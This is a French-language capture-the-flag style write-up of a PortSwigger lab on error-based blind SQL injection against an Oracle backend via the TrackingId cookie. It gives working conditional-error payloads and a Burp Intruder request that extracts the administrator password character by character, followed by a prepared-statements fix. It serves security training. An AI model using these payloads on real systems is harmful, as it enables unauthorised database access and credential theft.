# 💉 Lab : Blind SQL injection with conditional errors
**Catégorie :** Injection SQL (SQLi)
**Type :** Blind SQLi (Error-Based / Erreurs conditionnelles)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL en aveugle via le cookie `TrackingId`. L'application ne modifie pas son affichage classique, mais renvoie un code HTTP 500 (Internal Server Error) si la requête SQL génère une erreur backend. En forçant intentionnellement une division par zéro via une clause conditionnelle (`CASE WHEN`), il est possible de valider des hypothèses (vrai/faux) et d'exfiltrer des données caractère par caractère.

## 🛠️ Preuve de Concept (PoC)
L'attaque a été ciblée sur l'environnement **Oracle** en utilisant la concaténation (`||`) et la table virtuelle `dual`.

1. **Vérification du vecteur d'attaque :**
   - Condition VRAIE : `TrackingId=ZgguKB6DnT6Dqies'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> **Erreur HTTP 500**
   - Condition FAUSSE : `TrackingId=ZgguKB6DnT6Dqies'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` -> **HTTP 200 OK**

2. **Exfiltration automatisée (Brute-force) :**
   L'extraction a été automatisée avec **Burp Suite Intruder** (attaque de type Cluster Bomb).
   - **Requête HTTP utilisée :**
     ```http
     GET / HTTP/2
     Host: 0a86005f04fc16058167391f00370059.web-security-academy.net
     Cookie: TrackingId=ZgguKB6DnT6Dqies'||(SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=4rbux4CYXPbbUBQFuOEswFw5CZaM8ojV
     ```
   - **Position 1 (`§1§`) :** Nombres de 1 à 20 (position du caractère).
   - **Position 2 (`§a§`) :** Caractères alphanumériques (`a-z`, `0-9`).

3. **Résultat :**
   Le filtrage des réponses par code statut (`500`) dans Burp Intruder a permis de reconstituer l'intégralité du mot de passe de l'administrateur.
   - **Mot de passe extrait :** `[LE_MOT_DE_PASSE_TROUVÉ]`

*La connexion avec ces identifiants a permis de résoudre le laboratoire.*

## 🛡️ Recommandation de Sécurité
Ne jamais utiliser les valeurs des cookies pour construire dynamiquement des requêtes SQL. L'utilisation systématique de **requêtes préparées (Prepared Statements)** neutralise cette vulnérabilité en empêchant l'altération de la logique SQL.